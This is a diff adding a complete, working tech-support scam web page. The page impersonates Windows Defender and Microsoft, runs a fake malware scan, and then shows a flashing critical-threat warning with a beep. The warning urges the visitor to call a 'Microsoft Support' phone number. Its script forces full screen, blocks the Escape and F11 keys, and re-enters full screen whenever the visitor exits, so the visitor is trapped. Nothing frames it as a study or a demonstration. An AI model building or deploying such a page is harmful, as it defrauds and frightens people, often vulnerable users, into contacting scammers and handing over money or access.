@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows Defender Security Alert</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        /* Windows 11 Theme */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: url('https://cdn.wallpapersafari.com/61/92/CFM4u2.jpg') no-repeat center center/cover;
+            color: white;
+            text-align: center;
+            overflow: hidden;
+        }
+
+        /* Microsoft Logo */
+        .logo {
+            margin-top: 20px;
+            width: 150px;
+        }
+
+        /* Scan Window */
+        .scan-container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.9);
+            padding: 30px;
+            border-radius: 10px;
+            width: 500px;
+            box-shadow: 0px 4px 15px rgba(0, 0, 255, 0.5);
+            backdrop-filter: blur(10px);
+        }
+
+        .scan-title {
+            font-size: 22px;
+            font-weight: bold;
+        }
+
+        /* Progress Bar */
+        .progress-bar {
+            width: 100%;
+            background: #222;
+            border-radius: 5px;
+            margin-top: 20px;
+            height: 20px;
+            position: relative;
+        }
+
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: limegreen;
+            border-radius: 5px;
+            transition: width 0.5s;
+        }
+
+        /* Scan Logs */
+        .scan-logs {
+            margin-top: 20px;
+            font-size: 14px;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 10px;
+            border-radius: 5px;
+            height: 100px;
+            overflow-y: auto;
+            text-align: left;
+        }
+
+        /* RED CRITICAL ALERT POPUP */
+        .critical-warning {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: darkred;
+            color: white;
+            padding: 30px;
+            border-radius: 10px;
+            width: 80%;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            box-shadow: 0px 0px 15px red;
+            z-index: 9999;
+            animation: flash 1s infinite alternate;
+        }
+
+        @keyframes flash {
+            from { opacity: 1; }
+            to { opacity: 0.3; }
+        }
+
+        /* Toll-Free Banner */
+        .toll-free-banner {
+            display: none;
+            position: fixed;
+            bottom: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.9);
+            color: white;
+            padding: 15px 25px;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            text-align: center;
+            box-shadow: 0px 5px 15px rgba(255, 0, 0, 0.7);
+            animation: pulse 1.5s infinite alternate;
+            z-index: 9999;
+        }
+
+        @keyframes pulse {
+            from { transform: translateX(-50%) scale(1); }
+            to { transform: translateX(-50%) scale(1.05); }
+        }
+    </style>
+</head>
+<body>
+
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" class="logo" alt="Microsoft Logo">
+
+    <!-- Scan Progress -->
+    <div class="scan-container">
+        <div class="scan-title">Windows Defender Security Scan</div>
+        <p id="scan-status">Initializing scan...</p>
+
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+
+        <div class="scan-logs" id="scanLogs">
+            <p>Loading security definitions...</p>
+        </div>
+    </div>
+
+    <!-- Critical Alert -->
+    <div class="critical-warning" id="criticalWarning">
+        ⚠ CRITICAL SECURITY WARNING! ⚠ <br>
+        A severe threat has been detected. Immediate action required! <br>
+        Call Microsoft Support: <span style="color: yellow;">+1-800-555-0199</span>
+    </div>
+
+    <!-- Toll-Free Banner -->
+    <div class="toll-free-banner" id="tollFreeBanner">
+        Call Microsoft Support Now: <span style="color: yellow;">+1-800-555-0199</span>
+    </div>
+
+    <audio id="alertSound">
+        <source src="https://www.soundjay.com/button/beep-10.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        let scanProgress = 0;
+        let logMessages = [
+            "Scanning system files...",
+            "Checking registry entries...",
+            "Analyzing network traffic...",
+            "Verifying software integrity...",
+            "Looking for unusual behavior...",
+            "Checking Windows Defender logs...",
+            "Inspecting running processes...",
+            "Verifying system permissions...",
+            "Cross-referencing threat database...",
+            "Almost done...",
+            "⚠ WARNING: Suspicious activity detected!"
+        ];
+
+        function startScan() {
+            requestFullScreen();
+
+            let logIndex = 0;
+            let scanInterval = setInterval(() => {
+                scanProgress += 10;
+                $("#progressFill").css("width", scanProgress + "%");
+                $("#scan-status").text(scanProgress + "% Complete");
+
+                if (logIndex < logMessages.length) {
+                    $("#scanLogs").append("<p>" + logMessages[logIndex] + "</p>");
+                    logIndex++;
+                }
+
+                if (scanProgress >= 99) {
+                    clearInterval(scanInterval);
+                    setTimeout(showThreatWarning, 2000);
+                }
+            }, 1500);
+        }
+
+        function showThreatWarning() {
+            $("#criticalWarning").fadeIn();
+            $("#tollFreeBanner").fadeIn();
+            document.getElementById("alertSound").play();
+        }
+
+        // Modern full-screen request function (supports latest browsers like Edge, Chrome, Firefox)
+        function requestFullScreen() {
+            let elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen();
+            } else if (elem.mozRequestFullScreen) { // Firefox
+                elem.mozRequestFullScreen();
+            } else if (elem.webkitRequestFullscreen) { // Chrome, Safari, Opera
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) { // Edge
+                elem.msRequestFullscreen();
+            }
+        }
+
+        // Prevent exiting fullscreen with key presses (F11, Esc, etc.)
+        document.addEventListener("keydown", function(event) {
+            if (event.key === "Escape" || event.key === "F11" || (event.ctrlKey && event.key === "F4")) {
+                event.preventDefault();
+            }
+        });
+
+        // Re-enter fullscreen if user exits
+        document.addEventListener("fullscreenchange", () => {
+            if (!document.fullscreenElement) {
+                requestFullScreen();
+            }
+        });
+        document.addEventListener("webkitfullscreenchange", () => {
+            if (!document.webkitFullscreenElement) {
+                requestFullScreen();
+            }
+        });
+        document.addEventListener("mozfullscreenchange", () => {
+            if (!document.mozFullScreen) {
+                requestFullScreen();
+            }
+        });
+        document.addEventListener("msfullscreenchange", () => {
+            if (!document.msFullscreenElement) {
+                requestFullScreen();
+            }
+        });
+
+        // Start scanning ONLY when fullscreen is enabled
+        document.addEventListener("click", function() {
+            if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreen && !document.msFullscreenElement) {
+                requestFullScreen();
+            } else {
+                startScan();
+            }
+        });
+    </script>
+
+</body>
+</html>
